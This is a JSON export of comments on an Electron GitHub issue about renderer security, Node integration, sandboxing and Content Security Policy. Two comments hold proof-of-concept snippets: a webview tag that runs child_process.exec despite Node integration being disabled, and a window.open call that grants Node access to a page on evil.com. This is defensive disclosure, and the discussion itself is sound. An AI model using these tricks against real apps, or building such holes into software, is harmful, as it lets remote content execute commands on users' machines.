    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-167565891",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 167565891,
    "user": {
      "login": "seanchas116",
      "id": 1025246,
      "avatar_url": "https://avatars1.githubusercontent.com/u/1025246?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/seanchas116",
      "html_url": "https://github.com/seanchas116",
      "followers_url": "https://api.github.com/users/seanchas116/followers",
      "following_url": "https://api.github.com/users/seanchas116/following{/other_user}",
      "gists_url": "https://api.github.com/users/seanchas116/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/seanchas116/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/seanchas116/subscriptions",
      "organizations_url": "https://api.github.com/users/seanchas116/orgs",
      "repos_url": "https://api.github.com/users/seanchas116/repos",
      "events_url": "https://api.github.com/users/seanchas116/events{/privacy}",
      "received_events_url": "https://api.github.com/users/seanchas116/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-12-28T13:08:53Z",
    "updated_at": "2015-12-28T13:08:53Z",
    "body": "By the way, it seems that you can inject scripts with full Node API access **even if Node integration is disabled** using `<webview>` tags.\n\nExample (details in #3921): \n\n``` js\n<webview\n  nodeintegration\n  src=\"data:text/html,<script>require('child_process').exec('atom package.json')</script>\">\n</webview>\n\n```\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/169887703",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-169887703",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 169887703,
    "user": {
      "login": "wearhere",
      "id": 110000,
      "avatar_url": "https://avatars1.githubusercontent.com/u/110000?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/wearhere",
      "html_url": "https://github.com/wearhere",
      "followers_url": "https://api.github.com/users/wearhere/followers",
      "following_url": "https://api.github.com/users/wearhere/following{/other_user}",
      "gists_url": "https://api.github.com/users/wearhere/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/wearhere/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/wearhere/subscriptions",
      "organizations_url": "https://api.github.com/users/wearhere/orgs",
      "repos_url": "https://api.github.com/users/wearhere/repos",
      "events_url": "https://api.github.com/users/wearhere/events{/privacy}",
      "received_events_url": "https://api.github.com/users/wearhere/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-01-08T04:06:14Z",
    "updated_at": "2016-01-08T04:06:14Z",
    "body": "Node integration can also be re-enabled for new windows (https://github.com/atom/electron/issues/4026):\n\n``` js\n// JavaScript on 'evil.com' will be able to `require('fs')` etc.\nwindow.open('http://evil.com', '', 'nodeIntegration=1');\n```\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/177012483",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-177012483",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 177012483,
    "user": {
      "login": "bengotow",
      "id": 1037212,
      "avatar_url": "https://avatars0.githubusercontent.com/u/1037212?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/bengotow",
      "html_url": "https://github.com/bengotow",
      "followers_url": "https://api.github.com/users/bengotow/followers",
      "following_url": "https://api.github.com/users/bengotow/following{/other_user}",
      "gists_url": "https://api.github.com/users/bengotow/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/bengotow/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/bengotow/subscriptions",
      "organizations_url": "https://api.github.com/users/bengotow/orgs",
      "repos_url": "https://api.github.com/users/bengotow/repos",
      "events_url": "https://api.github.com/users/bengotow/events{/privacy}",
      "received_events_url": "https://api.github.com/users/bengotow/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-01-29T23:11:33Z",
    "updated_at": "2016-01-29T23:11:40Z",
    "body": "Hey folks—just wanted to chime in because this was brought up in an N1 issue. I'm curious if anyone could elaborate on this:\n\n> It's not about deliberately running remote content. It's about accidentally running remote content. For example, a chat app may be entirely written locally, but it still needs to display remote content.\n\nIn N1, we use a `script-src 'self'` Content Security Policy to block all remote and inline script tags. I figured that was enough to rule out \"accidentally running remote content\" (where that content is determined to be a script). An attacker might be able to get a `<script>` tag into the body of the page, but that script tag should be blocked. Are there any loopholes we need to think about if we already have a strict CSP?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/182605054",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-182605054",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 182605054,
    "user": {
      "login": "diracdeltas",
      "id": 549654,
      "avatar_url": "https://avatars2.githubusercontent.com/u/549654?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/diracdeltas",
      "html_url": "https://github.com/diracdeltas",
      "followers_url": "https://api.github.com/users/diracdeltas/followers",
      "following_url": "https://api.github.com/users/diracdeltas/following{/other_user}",
      "gists_url": "https://api.github.com/users/diracdeltas/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/diracdeltas/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/diracdeltas/subscriptions",
      "organizations_url": "https://api.github.com/users/diracdeltas/orgs",
      "repos_url": "https://api.github.com/users/diracdeltas/repos",
      "events_url": "https://api.github.com/users/diracdeltas/events{/privacy}",
      "received_events_url": "https://api.github.com/users/diracdeltas/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-02-10T22:21:28Z",
    "updated_at": "2016-02-10T22:21:28Z",
    "body": "In case it is of interest to anyone, Brave's fork of Electron re-enables the sandbox for renderers that don't run node. https://github.com/brave/electron/pull/12/files\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/182616394",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-182616394",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 182616394,
    "user": {
      "login": "wearhere",
      "id": 110000,
      "avatar_url": "https://avatars1.githubusercontent.com/u/110000?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/wearhere",
      "html_url": "https://github.com/wearhere",
      "followers_url": "https://api.github.com/users/wearhere/followers",
      "following_url": "https://api.github.com/users/wearhere/following{/other_user}",
      "gists_url": "https://api.github.com/users/wearhere/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/wearhere/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/wearhere/subscriptions",
      "organizations_url": "https://api.github.com/users/wearhere/orgs",
      "repos_url": "https://api.github.com/users/wearhere/repos",
      "events_url": "https://api.github.com/users/wearhere/events{/privacy}",
      "received_events_url": "https://api.github.com/users/wearhere/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-02-10T22:43:13Z",
    "updated_at": "2016-02-10T22:43:21Z",
    "body": "@diracdeltas I imagine that prevents even preload scripts from using Node APIs though?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/182618667",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-182618667",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 182618667,
    "user": {
      "login": "etiktin",
      "id": 4381579,
      "avatar_url": "https://avatars1.githubusercontent.com/u/4381579?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/etiktin",
      "html_url": "https://github.com/etiktin",
      "followers_url": "https://api.github.com/users/etiktin/followers",
      "following_url": "https://api.github.com/users/etiktin/following{/other_user}",
      "gists_url": "https://api.github.com/users/etiktin/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/etiktin/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/etiktin/subscriptions",
      "organizations_url": "https://api.github.com/users/etiktin/orgs",
      "repos_url": "https://api.github.com/users/etiktin/repos",
      "events_url": "https://api.github.com/users/etiktin/events{/privacy}",
      "received_events_url": "https://api.github.com/users/etiktin/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-02-10T22:50:10Z",
    "updated_at": "2016-02-10T22:50:10Z",
    "body": "@wearhere the sandboxing is enabled only if there's no node integration and no preload script. So it should be fine.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/217370946",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-217370946",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 217370946,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-05-06T07:35:03Z",
    "updated_at": "2016-05-06T07:35:03Z",
    "body": "I'm closing this since the security problems discussed here had been divided into separate issues.\n"
  }
]